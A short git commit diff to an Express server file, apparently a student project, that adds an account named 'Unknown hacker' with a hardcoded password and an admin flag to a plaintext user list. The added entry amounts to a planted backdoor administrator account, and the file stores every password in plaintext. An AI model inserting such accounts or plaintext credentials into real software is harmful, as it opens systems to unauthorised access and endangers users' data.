6e60cef0a93b8e50936742c2f0f1df1b17c13acd
IQ=180 <adamwu0331@gmail.com>
2025-04-13 11:35:59 +0800

    Update server.js

--- server.js
+++ server.js
@@ -8,6 +8,7 @@ app.use(express.json()); // 讓 Express 能請求中 JSON 格式的資料
 
 //用戶資料
 let accounts = [
+      { username: 'Unknown hacker', password: '310721', isadmin: true },
       { username: '81201', password: '123456', isAdmin: false },
       { username: '81202', password: '221102', isAdmin: false },
       { username: '81203', password: '123456', isAdmin: false },
